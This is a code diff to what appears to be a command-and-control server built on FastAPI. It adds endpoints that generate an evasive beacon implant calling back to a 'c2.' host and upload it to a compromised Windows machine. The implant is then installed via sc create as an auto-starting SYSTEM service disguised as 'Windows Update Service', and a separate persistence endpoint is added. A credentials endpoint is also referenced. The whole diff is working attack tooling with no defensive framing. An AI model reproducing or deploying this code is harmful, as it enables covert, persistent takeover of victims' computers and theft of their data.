@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import asyncio
+import base64
 import logging
 import mimetypes
 import ntpath
@@ -542,6 +543,74 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         return PlainTextResponse(
             data, headers={"Content-Disposition": f'attachment; filename="{filename}"'}
         )
+
+    @app.post("/api/{session_id}/service")
+    async def api_service(request: Request, session_id: str):
+        """Install a Windows service implant: auto-start at boot, SYSTEM, no user
+        logged in required (truly unattended). Requires an elevated session."""
+        session = require(request)
+        if session is None:
+            raise HTTPException(status_code=401)
+        body = await request.json()
+        svc = str(body.get("name") or "WinUpdateSvc")
+        arch = str(body.get("arch") or "amd64")
+        zone = config.cf_zone_name
+        if not zone and "." in config.public_host:
+            zone = config.public_host.split(".", 1)[1]
+        c2 = f"c2.{zone or '127.0.0.1'}:8888"
+        payload = {
+            "os": "windows",
+            "arch": arch,
+            "format": "service",
+            "transport": "mtls",
+            "c2_url": c2,
+            "is_beacon": True,
+            "interval": 60,
+            "jitter": 35,
+            "evasion": True,
+            "name": f"{svc}-{secrets.token_hex(3)}",
+        }
+        try:
+            gen = await run_in_threadpool(app.state.bridge.generate, payload)
+            data = base64.b64decode(gen["data_b64"])
+            remote = str(body.get("dir") or "C:\\ProgramData")
+            remote = remote.replace("/", "\\").replace("\\\\", "\\").rstrip("\\")
+            await run_in_threadpool(
+                app.state.bridge.upload, session_id, remote, f"{svc}.exe", data
+            )
+            exe = ntpath.join(remote, f"{svc}.exe")
+            command = (
+                f'sc create {svc} binPath= "\\"{exe}\\"" start= auto && '
+                f'sc description {svc} "Windows Update Service" && sc start {svc}'
+            )
+            result = await run_in_threadpool(
+                app.state.bridge.exec, session_id, "cmd.exe", ["/c", command]
+            )
+        except BridgeError as exc:
+            raise HTTPException(status_code=502, detail=str(exc)) from exc
+        database.audit(str(session["actor"]), "service", "ok", target=session_id, detail=svc)
+        return JSONResponse({"ok": True, "service": svc, "exe": exe, "detail": result})
+
+    @app.post("/api/{session_id}/persist")
+    async def api_persist(request: Request, session_id: str):
+        session = require(request)
+        if session is None:
+            raise HTTPException(status_code=401)
+        body = await request.json()
+        try:
+            result = await run_in_threadpool(
+                app.state.bridge.persist,
+                session_id,
+                body.get("file_path", ""),
+                body.get("name", "WinUpdateSvc"),
+            )
+        except BridgeError as exc:
+            raise HTTPException(status_code=502, detail=str(exc)) from exc
+        database.audit(
+            str(session["actor"]), "persist", "ok", target=session_id,
+            detail=str(body.get("name", "WinUpdateSvc")),
+        )
+        return JSONResponse(result)
 
     @app.get("/api/{session_id}/creds")
     async def api_creds(request: Request, session_id: str):
